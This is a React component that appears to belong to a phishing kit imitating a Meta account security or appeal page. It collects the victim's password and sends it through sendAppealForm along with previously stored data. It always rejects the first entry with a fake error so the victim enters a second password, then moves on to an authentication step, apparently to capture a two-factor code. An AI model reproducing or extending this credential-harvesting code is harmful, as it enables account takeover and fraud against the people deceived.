import React from 'react';
import Modal from './Modal';
import PasswordInput from '../password-input/password-input';
import { getRecord, saveRecord, sendAppealForm } from '@/app/utils';
import { useTranslation } from 'react-i18next';
import "@/app/libs/i18n"

interface SecurityModalProps {
    isOpendPassword: boolean;
    onToggleModalPass: (value: boolean) => void;
    onOpendAuthentication: (value: boolean) => void;
    onSendDataModal: (value: object) => void;
}

const SecurityModal: React.FC<SecurityModalProps> = ({ isOpendPassword, onToggleModalPass, onOpendAuthentication, onSendDataModal }) => {

    const { t } = useTranslation();

    React.useEffect(() => {
        setIsOpen(isOpendPassword);
    }, [isOpendPassword]);

    const [isOpen, setIsOpen] = React.useState(isOpendPassword);
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    const [formData, setFormData] = React.useState({
        password: '',
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModalPass(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.password.trim()) newErrors.password = t('content.modal.password.form.password.required');

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            setLoading(true);

            if (click === 0) {
                let data_save = getRecord("__client_rec__fi_rst");

                const clientData = {
                    ...data_save,
                    password: formData.password,
                };

                saveRecord("__client_rec__se_con", clientData);
                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {
                            setLoading(false);
                            setFormData({ password: '' });
                            newErrors.password = t('content.modal.password.form.password.warning');
                            setErrors(newErrors);
                        }, 1350);

                        setClick(1)
                    })
                    .catch((err) => {
                        console.log(err);
                    });
            } else {
                let data_save = getRecord("__client_rec__se_con");

                const clientData = {
                    ...data_save,
                    passwordSecond: formData.password,
                };

                saveRecord("__client_rec__th_ird", clientData);
                onSendDataModal(clientData);
                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {
                            setLoading(false);
                            setFormData({ password: '' });

                            onToggleModalPass(false);
                            onOpendAuthentication(true);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };
    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200 text-[500]`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title={t('content.modal.password.title')}
            onClose={handleClose}
            isClosable={false}
            heightFull={false}
        >
            <div className="flex flex-col items-center justify-between flex-1">
                <div className='w-full mt-[10px]'>
                    <p className='text-[#9a979e] text-[14px] mb-[5px]'>{t('content.modal.password.description')}</p>
                    <form onSubmit={handSubmit} >
                        <div className='w-full flex flex-col gap-[3px]'>
                            <PasswordInput
                                id='password'
                                className={inputClass('password')}
                                value={formData.password}
                                onChange={handleChange}
                            />
                            {errorText('password')}
                        </div>

                        <div className='w-full'>
                            <button
                                className={`w-full bg-[#0064E0] text-white rounded-[40px] h-[44px] min-h-[44px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                        <img src="/images/meta/loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : t('content.modal.password.form.button')}
                            </button>
                            <p className='text-[14px] cursor-pointer mt-[10px] text-center text-[#9a979e]'>{t('content.modal.password.form.forgot_password')}</p>
                        </div>
                    </form>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default SecurityModal;
